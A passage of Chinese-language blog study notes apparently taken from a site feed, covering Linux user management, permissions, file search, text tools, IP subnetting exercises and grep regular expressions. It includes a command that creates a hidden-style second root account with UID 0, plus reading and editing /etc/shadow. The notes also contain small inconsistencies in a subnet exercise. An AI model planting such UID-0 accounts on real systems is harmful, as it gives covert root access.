</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-basic-1.png" alt="使用通配符"></p><h2 id="shell-常用通配符"><a href="#shell-常用通配符" class="headerlink" title="shell 常用通配符"></a>shell 常用通配符</h2><table><thead><tr><th>通配符</th><th>作用</th></tr></thead><tbody><tr><td><strong>*</strong></td><td>匹配 0 或多个字符</td></tr><tr><td><strong>?</strong></td><td>匹配任意一个字符</td></tr><tr><td><strong>[list]</strong></td><td>匹配 list 中的任意单一字符</td></tr><tr><td><strong>[!list]</strong></td><td>匹配 除list 中的任意单一字符以外的字符</td></tr><tr><td><strong>[c1-c2]</strong></td><td>匹配 c1-c2 中的任意单一字符 如：<code>[0-9] [a-z]</code></td></tr><tr><td><strong>{string1,string2,…}</strong></td><td>匹配 sring1 或 string2 (或更多)其一字符串</td></tr><tr><td><strong>{c1..c2}</strong></td><td>匹配 c1-c2 中全部字符 如 <code>{1..10}</code></td></tr></tbody></table><h1 id="命令手册速查"><a href="#命令手册速查" class="headerlink" title="命令手册速查"></a>命令手册速查</h1><blockquote><p>Liunx 下命令成千上百，有个速查手册也是不错的，<a href="//man.linuxde.net/">Liunx 命令速查手册</a></p></blockquote><h1 id="Liunx-用户管理"><a href="#Liunx-用户管理" class="headerlink" title="Liunx 用户管理"></a>Liunx 用户管理</h1><h2 id="获取当前登录的用户"><a href="#获取当前登录的用户" class="headerlink" title="获取当前登录的用户"></a>获取当前登录的用户</h2><pre><code class="bash">who # 获取当前登录的所有用户信息（包括远程登录）
whoami # 获取当前登录的用户名
who am i # 获取当前登录用户的信息
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-basic-2.png" alt="获取当前登录的用户"></p><blockquote><p>第一列表示打开当前伪终端的用户的用户名<br><br>第二列的 pts/0 中 pts 表示伪终端，所谓伪是相对于 /dev/tty 设备而言的,使用 <code>[Ctrl]+[Alt]+[F1]～[F7]</code> 进行切换的 /dev/tty 设备,这是”真终端”，伪终端就是当你在图形用户界面使用 /dev/tty7 时每打开一个终端就会产生一个伪终端，pts/0 后面那个数字就表示打开的伪终端序号<br><br>第三列则表示当前伪终端的启动时间</p></blockquote><h2 id="创建用户、切换用户"><a href="#创建用户、切换用户" class="headerlink" title="创建用户、切换用户"></a>创建用户、切换用户</h2><pre><code class="bash">adduser [userName]            # 通过询问的方式进行新增用户
useradd -m [userName]         # 通过自行添加参数方式新增用户
useradd -u 0 -o [userName]    # 添加 uid 为 0 的用户，即 root 用户的别名，拥有 root 的权限
userdel -r [userName]         # 永久删除用户
id                          # 查看用户的 uid 或 gid 等信息
su -                        # 切换到 root 用户
su - [userName]             # 切换某一个用户
passwd                      # 为当前用户设置密码
</code></pre><blockquote><p>用户信息将被保存至 /etc/passwd，用户密码将被保存至 /etc/shadow<br><br>使用 root 用户可以修改其内容，只需使用 wq!，强制保存就好</p></blockquote><h2 id="创建组、添加组成员"><a href="#创建组、添加组成员" class="headerlink" title="创建组、添加组成员"></a>创建组、添加组成员</h2><pre><code class="bash">groupadd [groupName]                # 添加用户组
groupdel [groupName]                # 删除用户组
usermod -G [groupName] [userName]     # 将用户 添加至用户组，-G 附属组，-g 主属组
</code></pre><blockquote><p>组信息将被保存至 /etc/group，组密码将保存至 /etc/gshadow<br><br>使用 root 用户可以修改其内容，只需使用 wq!，强制保存就好</p></blockquote><h2 id="禁用和解锁用户"><a href="#禁用和解锁用户" class="headerlink" title="禁用和解锁用户"></a>禁用和解锁用户</h2><h3 id="passwd-方法"><a href="#passwd-方法" class="headerlink" title="passwd 方法"></a>passwd 方法</h3><pre><code class="bash">passwd -l [userName]    #禁用
passwd -u [userName]    #解锁
</code></pre><h3 id="修改-etc-shadow-文件（root-用户）"><a href="#修改-etc-shadow-文件（root-用户）" class="headerlink" title="修改 /etc/shadow 文件（root 用户）"></a>修改 <code>/etc/shadow</code> 文件（root 用户）</h3><pre><code class="bash">vim /etc/shadow
</code></pre><p>禁用则在密码位前手工添加 ! （启用删除 ! 即可），如：</p><pre><code class="bash">test:!$1$afiVSYfG$utdc2qWLNrqNcy63Ca8301:16998:0:99999:7:::
</code></pre><p>或</p><pre><code class="bash">test:!!$1$afiVSYfG$utdc2qWLNrqNcy63Ca8301:16998:0:99999:7:::
</code></pre><p>使用 <code>:wq!</code> 强制保存</p><h3 id="usermod-方法"><a href="#usermod-方法" class="headerlink" title="usermod 方法"></a>usermod 方法</h3><pre><code class="bash">usermod -L [userName]    #禁用
usermod -U [userName]    #解锁
</code></pre><h2 id="设置用户一登录就要修改密码"><a href="#设置用户一登录就要修改密码" class="headerlink" title="设置用户一登录就要修改密码"></a>设置用户一登录就要修改密码</h2><pre><code class="bash">chage -d 0 [userName]
# 这个命令其实是把密码修改日期归 0 了 （/etc/shadow 文件第 3 个字段）
</code></pre><h2 id="查看当前登录的用户的环境变量"><a href="#查看当前登录的用户的环境变量" class="headerlink" title="查看当前登录的用户的环境变量"></a>查看当前登录的用户的环境变量</h2><pre><code class="bash">env
</code></pre><h1 id="Liunx-文件权限"><a href="#Liunx-文件权限" class="headerlink" title="Liunx 文件权限"></a>Liunx 文件权限</h1><h2 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h2><pre><code class="bash">ls -l       # 可以简写成 ll，注意有些版本的 Liunx 不支持
</code></pre><h3 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h3><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-basic-3.png" alt="权限介绍"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-basic-4.png" alt="权限介绍"></p><blockquote><p>通常我们使用数字表示权限，4 为读取权限，2 为写入权限，1 为执行权限。所以权限为 777 的为最高权限</p></blockquote><h2 id="权限的设置"><a href="#权限的设置" class="headerlink" title="权限的设置"></a>权限的设置</h2><pre><code class="bash">chmod 777 text.txt    # 设置最高权限
chmod o+w text.txt    # 为其他用户添加写权限
chmod g-r text.txt    # 为组中的所有用户去除读权限
</code></pre><h2 id="修改所属者和所属组"><a href="#修改所属者和所属组" class="headerlink" title="修改所属者和所属组"></a>修改所属者和所属组</h2><pre><code class="bash">chown root text.txt         # 修改所属者
chgrp text text.txt         # 修该所属组
chown root:text text.txt    # 修改所属者和所属组
</code></pre><h1 id="Liunx-文件的基本操作（很重要且很常用）"><a href="#Liunx-文件的基本操作（很重要且很常用）" class="headerlink" title="Liunx 文件的基本操作（很重要且很常用）"></a>Liunx 文件的基本操作（很重要且很常用）</h1><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><pre><code class="bash">touch test                            # 新建一个空文件
echo &quot;this is a text&quot; &gt; test.txt      # 输出内容重定向到文件，&gt; 覆盖操作
echo &quot;this is a text&quot; &gt;&gt; test.txt     # 输出内容重定向到文件，&gt;&gt; 追加操作
rm -f test.txt                        # 删除文件
</code></pre><h2 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h2><pre><code class="bash">mkdir [folderName]                        # 新建目录
mkdir -p [path]/[folderName]              # 若父级目录不存在，则一起创建
rm -rf [path]/[folderName]                # 删除目录
</code></pre><h2 id="复制操作"><a href="#复制操作" class="headerlink" title="复制操作"></a>复制操作</h2><pre><code class="bash">cp test [path]/[folderName]                       # 复制文件爱内
cp -r [path]/[folderName] [path]/[folderName]     # 复制目录
</code></pre><h2 id="移动、重命名操作"><a href="#移动、重命名操作" class="headerlink" title="移动、重命名操作"></a>移动、重命名操作</h2><pre><code class="bash">mv [fileName] [path]/[folderName]           # 移动文件
mv [fileName1] [fileName2]                  # 重命名

# 先用通配符批量创建 5 个文件
touch file{1..5}.txt
# 批量将这 5 个后缀为 .txt 的文本文件重命名为以 .c 为后缀的文件
rename &#39;s/\.txt/\.c/&#39; *.txt
# 批量将这 5 个文件，文件名改为大写
rename &#39;y/a-z/A-Z/&#39; *.c
</code></pre><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><pre><code class="bash">cat /etc/passwd
tail -n 5 /etc/passwd       # 只输出文件的末尾 5 行
file /bin/ls                # 可以查看文件的类型
</code></pre><blockquote><p>适用于快速查看文件，都是用来打印文件内容到标准输出（终端)，相同的命令有：cat (正序)、tac (倒序)、tail(按要求输出)和 nl 命令</p></blockquote><h1 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h1><h2 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h2><blockquote><p>直接从数据库中查询简单快速</p></blockquote><pre><code class="bash">whereis ls      # 直接从数据库中查询简单快速
</code></pre><h2 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h2><blockquote><p>快而全</p></blockquote><p>通过 <code>&quot;/var/lib/mlocate/mlocate.db&quot;</code> 数据库查找，不过这个数据库也不是实时更新的，系统会使用定时任务每天自动执行 updatedb 命令更新一次，所以有时候你刚添加的文件，它可能会找不到，你就得自己执行一次 updatedb 命令（在我们的环境中必须先执行一次该命令）。它可以用来查找指定目录下的不同文件类型，</p><p>如：查找 <code>/etc</code> 下所有以 sh 开头的文件</p><pre><code class="bash">locate /etc/sh
</code></pre><p>注意,它不只是在 etc 目录下查找并会自动递归子目录进行查找 查找 <code>/usr/share/</code> 下所有 jpg 文件</p><pre><code class="bash">locate /usr/share/*.jpg
</code></pre><p>注意要添加 <strong>*</strong> 号前面的反斜杠转义，否则会无法找到 只统计数目可以加上 -c 参数，-i 参数忽略大小写进行查找，whereis 的 -b,-m，-s 同样适用</p><h2 id="which"><a href="#which" class="headerlink" title="which"></a>which</h2><blockquote><p>避免了进入程序进行测试，很有用</p></blockquote><p>which 本身是 shell 内建的一个命令，我们通常使用 which 来确定是否安装了某个指定的软件，因为它只从 PATH 环境变量指定的路径中去搜索命令</p><pre><code class="bash">which man
</code></pre><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><blockquote><p>太精和太细，知道前面的命令就已经足够了</p></blockquote><p>find 应该是这几个命令中最强大的了，它不但可以通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳，文件的权限等）进行搜索</p><p>举个栗子：在指定目录下搜索指定文件名的文件</p><pre><code class="bash">find /etc/ -name interfaces
</code></pre><p>注意find命令的路径是作为第一个参数的， 基本命令格式为 <code>find [path] [option] [action]</code></p><h1 id="简单文件系统操作"><a href="#简单文件系统操作" class="headerlink" title="简单文件系统操作"></a>简单文件系统操作</h1><h2 id="查看磁盘和目录的容量"><a href="#查看磁盘和目录的容量" class="headerlink" title="查看磁盘和目录的容量"></a>查看磁盘和目录的容量</h2><h3 id="使用-df-命令查看磁盘的容量"><a href="#使用-df-命令查看磁盘的容量" class="headerlink" title="使用 df 命令查看磁盘的容量"></a>使用 df 命令查看磁盘的容量</h3><pre><code class="bash">df            # 以 blocks 的大小展示
df -h         # 人性化输出，以更易读的方式展示
</code></pre><h3 id="使用-du-命令查看目录的容量"><a href="#使用-du-命令查看目录的容量" class="headerlink" title="使用 du 命令查看目录的容量"></a>使用 du 命令查看目录的容量</h3><pre><code class="bash"># 默认同样以blocks的大小展示
du
# 加上-h参数，以更易读的方式展示
du -h

# 只查看1级目录的信息
du -h -d 0 ~
# 查看2级$ du -h -d 1 ~
</code></pre><h2 id="挂载光盘和卸载光盘"><a href="#挂载光盘和卸载光盘" class="headerlink" title="挂载光盘和卸载光盘"></a>挂载光盘和卸载光盘</h2><pre><code class="bash">mount /dev/cdrom /mnt/cdrom     # 挂载光盘
umount /dev/cdrom               # 卸载光盘
</code></pre><h2 id="wc-命令，简单小巧的计数工具"><a href="#wc-命令，简单小巧的计数工具" class="headerlink" title="wc 命令，简单小巧的计数工具"></a>wc 命令，简单小巧的计数工具</h2><pre><code class="bash">wc /etc/passwd
</code></pre><p>分别只输出行数、单词数、字节数、字符数和输入文本中最长一行的字节数</p><pre><code class="bash"># 行数
wc -l /etc/passwd

# 单词数
wc -w /etc/passwd

# 字节数
wc -c /etc/passwd

# 字符数
wc -m /etc/passwd

# 最长行字节数
wc -L /etc/passwd
</code></pre><blockquote><p>注意：对于西文字符来说，一个字符就是一个字节，但对于中文字符一个汉子是大于2个字节的，具体数目是由字符编码决定的</p></blockquote><h1 id="常用的文本处理命令"><a href="#常用的文本处理命令" class="headerlink" title="常用的文本处理命令"></a>常用的文本处理命令</h1><h2 id="tr-命令"><a href="#tr-命令" class="headerlink" title="tr 命令"></a>tr 命令</h2><p>tr 命令可以用来删除一段文本信息中的某些文字。或者将其进行转换 使用方式：</p><pre><code class="bash">tr [option]...SET1 [SET2]
</code></pre><p>常用选项：</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><strong>-d</strong></td><td>删除和 set1 匹配的字符，注意不是全词匹配也不是按字符顺序匹配</td></tr><tr><td><strong>-s</strong></td><td>去除 set1 指定的在输入文本中连续并重复的字符</td></tr></tbody></table><p><code>操作举例：</code></p><pre><code class="bash"># 删除 &quot;hello shiyanlou&quot; 中所有的&#39;o&#39;,&#39;l&#39;,&#39;h&#39;
echo &#39;hello shiyanlou&#39; | tr -d &#39;olh&#39;

# 将&quot;hello&quot; 中的ll,去重为一个l
echo &#39;hello&#39; | tr -s &#39;l&#39;

# 将输入文本，全部转换为大写或小写输出
cat /etc/passwd | tr &#39;[:lower:]&#39; &#39;[:upper:]&#39;
# 上面的&#39;[:lower:]&#39; &#39;[:upper:]&#39;你也可以简单的写作&#39;[a-z]&#39; &#39;[A-Z]&#39;,当然反过来将大写变小写也是可以的
</code></pre><h2 id="col-命令"><a href="#col-命令" class="headerlink" title="col 命令"></a>col 命令</h2><p>col 命令可以将 Tab 换成对等数量的空格建，或反转这个操作.用来格式化代码超爽 使用方式：</p><pre><code class="bash">col [option]
</code></pre><p>常用的选项有：</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><strong>-x</strong></td><td>将 Tab 转换为空格</td></tr><tr><td><strong>-h</strong></td><td>将空格转换为 Tab（默认选项）</td></tr></tbody></table><p><code>操作举例：</code></p><pre><code class="bash"># 查看/etc/protocols中的不可见字符，可以看到很多^I，这其实就是Tab键转义成可见字符的符号
cat -A /etc/protocols

# 使用col -x将/etc/protocols中的Tab转换为空格,然后再使用cat查看，你发现^I不见了
cat /etc/protocols | col -x | cat -A
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Command </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IP 地址规划]]></title>
      <url>/2016/09/ip-address-planning/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>当申请到一个 C 类网络地址时，很多时候需要对其子网划分，那么一个高效简便的子网划分方法由此而生<a id="more"></a></p><h1 id="先分清五类网络地址"><a href="#先分清五类网络地址" class="headerlink" title="先分清五类网络地址"></a>先分清五类网络地址</h1><blockquote><p>IP 地址分为 A，B，C，D，E 五类</p></blockquote><ul><li>网络号：用于识别主机所在的网络</li><li>主机号：用于识别该网络中的主机</li></ul><p>其中 A 类分配给政府机关使用，B 类地址给大中型企业使用，C 类地址给个人使用。这三种是主要的。</p><p>D 类用于组播，E 类用于实验，各类可容纳的地址数目不同。</p><p>其中 A 类、B 类、C 类这三类地址用于 <code>TCP/IP</code> 节点。其它两类 D 类和 E 类被用于特殊用途。</p><p>A、B、C 三类 IP 地址的特征：当将 IP 地址写成二进制形式时，A 类地址的第一位总是 O，B 类地址的前两位总是 10，C 类地址的前三位总是 <code>110</code>。</p><h2 id="A-类地址"><a href="#A-类地址" class="headerlink" title="A 类地址"></a>A 类地址</h2><ul><li>A 类地址第 1 字节为网络地址，其它 3 个字节为主机地址</li><li>A 类地址范围：<code>1.0.0.1</code> – <code>126.255.255.254</code></li><li><p>A 类地址中的私有地址和保留地址（所谓的私有地址就是在互联网上不使用，而被用在局域网络中的地址；保留地址则不被分配。）</p><ul><li><code>10.X.X.X</code> 是私有地址</li><li><code>127.X.X.X</code> 是保留地址，用做循环测试用的</li></ul></li><li><p>最大的网络数： <code>2^7-2</code>，网络中最大的主机数：<code>2^24-2</code></p></li></ul><h2 id="B-类地址"><a href="#B-类地址" class="headerlink" title="B 类地址"></a>B 类地址</h2><ul><li>B 类地址第 1 字节和第 2 字节为网络地址，其它 2 个字节为主机地址</li><li>B 类地址范围：<code>128.0.0.1</code> – <code>191.255.255.254</code></li><li><p>B 类地址的私有地址和保留地址</p><ul><li><code>172.16.0.0</code> – <code>172.31.255.255</code> 是私有地址</li><li><code>169.254.X.X</code> 是保留地址。如果你的 IP 地址是自动获取 IP 地址，而你在网络上又没有找到可用的 DHCP 服务器。就会得到其中一个 IP</li></ul></li><li><p>最大的网络数： <code>2^14-2</code>，网络中最大的主机数：<code>2^16-2</code></p></li></ul><h2 id="C-类地址"><a href="#C-类地址" class="headerlink" title="C 类地址"></a>C 类地址</h2><ul><li>C 类地址第 1 字节、第 2 字节和第 3 个字节为网络地址，第 4个个字节为主机地址。另外第 1 个字节的前三位固定为 <code>110</code></li><li>C 类地址范围：<code>192.0.0.1</code> – <code>223.255.255.254</code></li><li><p>C 类地址中的私有地址：</p><ul><li><code>192.168.X.X</code> 是私有地址</li></ul></li><li><p>最大的网络数： <code>2^21-2</code>，网络中最大的主机数：<code>2^8-2</code></p></li></ul><h2 id="D-类地址"><a href="#D-类地址" class="headerlink" title="D 类地址"></a>D 类地址</h2><ul><li><p>D 类地址不分网络地址和主机地址，它的第 1 个字节的前四位固定为 <code>1110</code></p></li><li><p>D 类地址范围：<code>224.0.0.1</code> – <code>239.255.255.254</code></p></li></ul><h2 id="E-类地址"><a href="#E-类地址" class="headerlink" title="E 类地址"></a>E 类地址</h2><ul><li>E 类地址也不分网络地址和主机地址，它的第 1 个字节的前五位固定为 <code>11110</code></li><li>E 类地址范围：<code>240.0.0.1</code> – <code>255.255.255.254</code></li></ul><h1 id="C-类-IP-地址规划"><a href="#C-类-IP-地址规划" class="headerlink" title="C 类 IP 地址规划"></a>C 类 IP 地址规划</h1><h2 id="首先，准确的记住-2-1-2-8-的得数"><a href="#首先，准确的记住-2-1-2-8-的得数" class="headerlink" title="首先，准确的记住 2^1 ~ 2^8 的得数"></a>首先，准确的记住 2^1 ~ 2^8 的得数</h2><pre><code class="text">2^1 = 2
2^2 = 4
2^3 = 8
2^4 = 16
2^5 = 32
2^6 = 64
2^7 = 128
2^8 = 256
</code></pre><h2 id="地址划分"><a href="#地址划分" class="headerlink" title="地址划分"></a>地址划分</h2><blockquote><p>划分时要么根据主机数来划分；要么根据子网数来划分。</p></blockquote><h3 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h3><blockquote><p>已知 IP 地址段和子网个数，求子网的规划</p></blockquote><pre><code class="text">已知，某公司总部申请到 200.200.200.0 网段，该公司总部有三个部门。
每个部门都将拥有属于该部门的子网，写出每个部门将会分配到的IP地址段（包含网络地址和广播地址）。
</code></pre><blockquote><p>解析： 要划分 3 个子网，那么 2^n&gt;=3 ，得出 n&gt;=2 ，取 n=2 ，即 2^2=4 ，可以划分四个子网。每个子网有 2^(8-2)-2=62 个主机。广播号等于网络号加 (2^(8-2)-1)，子网掩码为 24+2=26。</p></blockquote><p><code>答案：</code></p><pre><code class="text">四个子网分别是:

A: 200.200.200.0/26 ~ 200.200.200.63/26
B：200.200.200.64/26 ~ 200.200.200.127/26
C：200.200.200.128/26 ~ 200.200.200.191/26
D：200.200.200.192/26 ~ 200.200.200.255/26
</code></pre><h3 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h3><blockquote><p>已知 IP 地址段和各子网的主机个数，求子网规划</p></blockquote><pre><code class="text">已知，某公司总部申请到 200.200.200.0 网段，该公司总部有三个部门，
分别是 A 部们、B 部门、 C 部门，
其中 A 部门有 100 台电脑，B 部门有 48 台电脑，C 部门有 50 台电脑，
写出每个部门将会分配到的 IP 地址段（包含网络地址和广播地址）。
</code></pre><blockquote><p>解析：要划分 3 个子网，第一个子网有 100 台主机，那么 2^n&gt;=100，得出 n&gt;=7，则该子网总共能容纳主机数为 2^7-2=126。广播号等于网络号加上 (2^7-1)，该子网的掩码为 32-7=25。以此类推。</p></blockquote><p><code>答案：</code></p><pre><code class="text">三个子网分别是:

A：200.200.200.0/25 ~ 200.200.200.127/25
B：200.200.200.128/26 ~ 200.200.200.191/26
C：200.200.200.192/26 ~ 200.200.200.255/26
</code></pre><h2 id="IP-地址规划练习"><a href="#IP-地址规划练习" class="headerlink" title="IP 地址规划练习"></a>IP 地址规划练习</h2><pre><code>已知，某公司总部申请到 211.91.5.0 网段，该公司总部有六个部门，
每个部门对应的电脑台数分别是 A 部门 100 台、B 部门 50 台、C 部门 10 台、E 部门 10 台、F 部门 10 台。
写出每个部门将会分配到的 IP 地址段（包含网络地址和广播地址）。
</code></pre><blockquote><p>解析：要划分 6 个子网，第一个子网有 100 台主机，那么 2^n&gt;=100，得出 n&gt;=7，则该子网总共能容纳主机数为 2^7-2=126。广播号等于网络号加上 (2^7-1)，该子网的掩码为 32-7=25。以此类推。</p></blockquote><p><code>答案：</code></p><pre><code class="text">六个子网分别是:

A：211.91.5.0/25 ~ 211.91.5.127/25
B：211.91.5.128/26 ~ 211.91.5.191/26
C：211.91.5.192/28 ~ 211.91.5.207/28
D：211.91.5.208/28 ~ 211.91.5.223/28
E：211.91.5.224/28 ~ 211.91.5.239/28
F：211.91.5.240/28 ~ 211.91.5.255/28
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> networking </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Network </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 学习笔记（四）：基础正则表达式]]></title>
      <url>/2016/09/basic-regular-expression-under-liunx/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的学习笔记系列第四篇，本篇将介绍正则表达式。在做文字处理或编写程序时，用到查找、替换等功能，使用正则表达式能够简单快捷的完成目标。简单而言，正则表达式通过一些特殊符号的帮助，使用户可以轻松快捷的完成查找、删除、替换等处理程序<a id="more"></a></p><h1 id="正则表达式特殊符号"><a href="#正则表达式特殊符号" class="headerlink" title="正则表达式特殊符号"></a>正则表达式特殊符号</h1><ul><li><strong>[:alnum:]</strong> =&gt; 代表英文大小写字母及数字</li><li><strong>[:alpha:]</strong> =&gt; 代表英文大小写字母</li><li><strong>[:blank:]</strong> =&gt; 代表空格和 tab 键</li><li><strong>[:cntrl:]</strong> =&gt; 键盘上的控制按键，如 CR,LF,TAB,DEL</li><li><strong>[:digit:]</strong> =&gt; 代表数字</li><li><strong>[:graph:]</strong> =&gt; 代表空白字符以外的其他</li><li><strong>[:lower:]</strong> =&gt; 小写字母</li><li><strong>[:print:]</strong> =&gt; 可以被打印出来的任何字符</li><li><strong>[:punct:]</strong> =&gt; 代表标点符号</li><li><strong>[:upper:]</strong> =&gt; 代表大写字符</li><li><strong>[:space:]</strong> =&gt; 任何会产生空白的字符如空格，tab,CR 等</li><li><strong>[:xdigit:]</strong> =&gt; 代表 16 进位的数字类型</li></ul><h2 id="特殊符号实例"><a href="#特殊符号实例" class="headerlink" title="特殊符号实例"></a>特殊符号实例</h2><h3 id="新建文本"><a href="#新建文本" class="headerlink" title="新建文本"></a>新建文本</h3><p><code>For Example:</code></p><pre><code class="bash">vim test.txt
</code></pre><h3 id="文本内容"><a href="#文本内容" class="headerlink" title="文本内容"></a>文本内容</h3><p><code>For Example:</code></p><pre><code class="text">&quot;Open Source&quot; is a good mechanism to develop programs.
apple is my favorite food.
Football game is not use feet only.
this dress doesn&#39;t fit me.
However, this dress is about $ 3183 dollars.
GNU is free air not free beer.
Her hair is very beauty.
I can&#39;t finish the test.
Oh! The soup taste good.
motorcycle is cheap than car.
This window is clear.
the symbol &#39;*&#39; is represented as start.
Oh!My god!
The gd software is a library for drafting programs.
You are the best is mean you are the no. 1.
The world &lt;Happy&gt; is the same with &quot;glad&quot;.
I like dog.
google is the best tools for search keyword.
goooooogle yes!
go! go! Let&#39;s go.
# I am VBird
</code></pre><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><blockquote><p>所有查找到的内容将高亮显示</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">grep -n &#39;[[:lower]]&#39; test.txt     # 查找小写字母
grep -n &#39;[a-z]&#39; test.txt          # 同上

grep -n &#39;[[:digit:]]&#39; test.txt    # 查找数字
grep -n &#39;[0-9]&#39; test.txt          # 同上
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-1.png" alt="RegExp"></p><h1 id="grep-命令与正则表达式"><a href="#grep-命令与正则表达式" class="headerlink" title="grep 命令与正则表达式"></a>grep 命令与正则表达式</h1><h2 id="grep-命令查找字符串"><a href="#grep-命令查找字符串" class="headerlink" title="grep 命令查找字符串"></a>grep 命令查找字符串</h2><p><code>选项解释</code></p><pre><code class="bash">-a    #　将 binary 档案以 text 档案的方式搜寻数据
-c    # 计算找到 &#39;搜寻字符串&#39; 的次数
-i    # 忽略大小写的不同，所以大小写视为相同
-n    # 顺便输出行号
-v    # 反向选择，亦即显示出没有 &#39;搜寻字符串&#39; 内容的那一行！
</code></pre><h3 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h3><blockquote><p>文本内容与上一个实例一致。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">grep -n &#39;the&#39; test.txt

grep -in &#39;the&#39; test.txt
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-2.png" alt="RegExp"></p><h2 id="字符组匹配"><a href="#字符组匹配" class="headerlink" title="字符组匹配"></a>字符组匹配</h2><blockquote><p><code>[]</code> 中包含的任意一个字符。只能是一个。 字符组支持由连字符 <code>“ - ”</code> 来表示一个范围。当 <code>“ - ”</code> 前后构成范围时，要求前面字符的码位小于后面字符的码位。 <code>[^...]</code> 排除型字符组。排除后面的字符</p></blockquote><ul><li><strong>[abc]</strong> =&gt; 表示 “a” 或 “b” 或 “c”</li><li><strong>[0-9]</strong> =&gt; 表示 0~9 中任意一个数字，等价于 <code>[0123456789]</code></li><li><strong>[\u4e00-\u9fa5]</strong> =&gt; 表示任意一个汉字</li><li><strong>[^a1&lt;]</strong> =&gt; 表示除了 “a”、”1”、”&lt;” 外的其它任意一个字符</li><li><strong>[a-z]</strong> =&gt; 表示查找小写字母开头</li><li><strong>[^a-z]</strong> =&gt; 表示除了小写字母外的任意一个字符</li><li><strong>[A-Z]</strong> =&gt; 表示查找大写字母</li><li><strong>[^A-Z]</strong> =&gt; 表示除了大写字母 A-Z 的所有字符</li></ul><h3 id="操作实例-1"><a href="#操作实例-1" class="headerlink" title="操作实例"></a>操作实例</h3><blockquote><p>文本内容与上一个实例一致。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">grep -n &#39;t[ae]st&#39; test.txt
# 查找 “tast” 或者 “test” 两个字符串。

grep -n &#39;^#&#39; test.txt
# 查找以 # 号开头的字符串

grep -n &#39;[^g]oog&#39; test.txt
# 查找非以 g 开头，以 `oog` 结尾的字符串
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-3.png" alt="RegExp"></p><h2 id="行首符-‘-’-与行尾符-‘-’"><a href="#行首符-‘-’-与行尾符-‘-’" class="headerlink" title="行首符: ‘^’ 与行尾符: ‘$’"></a>行首符: ‘^’ 与行尾符: ‘$’</h2><ul><li><strong>^$</strong> =&gt; 过滤掉空白行</li><li><strong>^#</strong> =&gt; 过滤掉注释行（以 <code>#</code> 开头）</li><li><strong>^a</strong> =&gt; 查找以 a 开头的字符串</li><li><strong>b$</strong> =&gt; 查找以 b 结尾的字符串</li></ul><h3 id="操作实例-2"><a href="#操作实例-2" class="headerlink" title="操作实例"></a>操作实例</h3><blockquote><p>文本内容与上一个实例一致。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">grep -n &#39;^the&#39; test.txt
grep -n &#39;d$&#39; test.txt

grep -v &#39;^$&#39; /etc/insserv.conf | grep -v &#39;^#&#39;
# 先过滤空白行，再过滤注释行
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-4.png" alt="RegExp"></p><h2 id="任意一个字符-‘-’与重复字符-‘-’"><a href="#任意一个字符-‘-’与重复字符-‘-’" class="headerlink" title="任意一个字符: ‘.’与重复字符 ‘*’"></a>任意一个字符: ‘.’与重复字符 ‘*’</h2><ul><li><strong>a.</strong> =&gt; 匹配字符 a 后任意单字符</li><li><strong>s∗</strong> =&gt; 匹配字符 s 后 0 个或多个此单字符</li></ul><h3 id="操作实例-3"><a href="#操作实例-3" class="headerlink" title="操作实例"></a>操作实例</h3><blockquote><p>文本内容与上一个实例一致。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">grep -n &#39;a.ou.&#39; test.txt

grep -n &#39;ooo*&#39; test.txt
grep -n &#39;orl**&#39; test.txt
